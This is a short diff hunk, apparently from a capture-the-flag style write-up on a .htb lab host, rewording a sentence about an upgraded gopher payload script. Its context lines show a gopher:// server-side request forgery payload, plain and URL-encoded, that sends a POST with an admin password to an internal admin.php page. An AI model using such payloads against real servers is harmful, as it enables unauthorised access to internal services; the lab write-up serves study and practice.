@@ -18,7 +18,7 @@ gopher://thatserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20thatserv
 gopher%3A//thatserver.htb%3A80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3A%2520thatserver.htb%250D%250AContent-Length%3A%252017%250D%250AContent-Type%3A%2520application/x-www-form-urlencoded%250D%250A%250D%250Apassword%253Dadmin123
 ```
 
-You may need to manually swap the request inside the `gopher-manual-1.1.py` -> This is upgrade version.
+You may need to manually swap the request inside the `gopher-manual-1.1.py` -> This is the upgraded version of the previous one.
 
 ```shell
 ┌──(kali㉿kali)-[~]
